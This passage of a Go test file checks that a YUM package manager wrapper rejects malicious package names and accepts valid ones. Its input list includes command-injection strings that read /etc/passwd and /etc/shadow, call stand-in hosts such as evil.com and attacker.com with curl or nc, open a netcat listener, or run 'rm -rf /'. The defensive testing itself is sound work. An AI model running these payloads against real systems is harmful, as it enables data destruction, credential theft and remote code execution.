		"package | cat /etc/passwd",   // Pipe redirection
		"package`id`",                 // Command substitution with backticks
		"package$(whoami)",            // Command substitution with $()
		"package > /tmp/hack",         // Output redirection
		"package < /etc/shadow",       // Input redirection
		"package || curl evil.com",    // OR command chaining
		"package & nc attacker.com",   // Background process
		"package;cat /etc/passwd",     // Semicolon without space
		"../../../etc/passwd",         // Path traversal
		"$(curl -s http://evil.com)",  // Remote code execution
		"`nc -l 4444`",                // Reverse shell attempt
		"rm -rf * #",                  // Destructive command with comment
		"package\nrm -rf /",           // Newline injection
		"package\trm -rf /",           // Tab injection
		"package' || rm -rf / #",      // SQL-style injection
		"package\" && curl evil.com",  // Quote injection
	}

	t.Logf("Testing %d malicious package name patterns", len(maliciousPackages))

	for _, malicious := range maliciousPackages {
		// Test Search operation
		_, err := mgr.Search(ctx, []string{malicious}, nil)
		if err == nil {
			t.Errorf("Expected error for malicious package name in Search: %s", malicious)
		}

		// Test Install operation
		_, err = mgr.Install(ctx, []string{malicious}, nil)
		if err == nil {
			t.Errorf("Expected error for malicious package name in Install: %s", malicious)
		}

		// Test Remove operation
		_, err = mgr.Remove(ctx, []string{malicious}, nil)
		if err == nil {
			t.Errorf("Expected error for malicious package name in Remove: %s", malicious)
		}

		// Test GetInfo operation
		_, err = mgr.GetInfo(ctx, malicious, nil)
		if err == nil {
			t.Errorf("Expected error for malicious package name in GetInfo: %s", malicious)
		}

		// Test Upgrade operation (single package)
		_, err = mgr.Upgrade(ctx, []string{malicious}, nil)
		if err == nil {
			t.Errorf("Expected error for malicious package name in Upgrade: %s", malicious)
		}

		// Test Verify operation
		_, err = mgr.Verify(ctx, []string{malicious}, nil)
		if err == nil {
			t.Errorf("Expected error for malicious package name in Verify: %s", malicious)
		}
	}

	// Test multiple malicious packages in single operation
	_, err := mgr.Install(ctx, maliciousPackages[:3], nil)
	if err == nil {
		t.Error("Expected error for multiple malicious package names")
	}

	// Test empty package names
	emptyPackages := []string{"", "   ", "\t", "\n"}
	for _, empty := range emptyPackages {
		_, err := mgr.Search(ctx, []string{empty}, nil)
		if err == nil {
			t.Errorf("Expected error for empty package name: '%s'", empty)
		}
	}

	// Test extremely long package names (potential buffer overflow)
	longPackage := strings.Repeat("a", 10000)
	_, err = mgr.Search(ctx, []string{longPackage}, nil)
	if err == nil {
		t.Error("Expected error for extremely long package name")
	}

	// Test valid package names (should not trigger validation errors)
	validPackages := []string{
		"vim",
		"nginx",
		"python3-pip",
		"httpd-tools",
		"kernel-core",
		"vim-enhanced",
		"python39-devel",
		"gcc-c++",
		"glibc-devel.x86_64",
	}

	for _, valid := range validPackages {
		// These should not fail validation (though they may fail for other reasons like not found)
		_, err := mgr.Search(ctx, []string{valid}, nil)
		// We don't check for specific errors here since we're using a mock runner
		// The important thing is that validation doesn't reject valid names
		if err != nil && strings.Contains(err.Error(), "invalid package name") {
			t.Errorf("Valid package name '%s' should not fail validation", valid)
		}
	}

	t.Logf("Successfully validated security checks for YUM package manager")
}
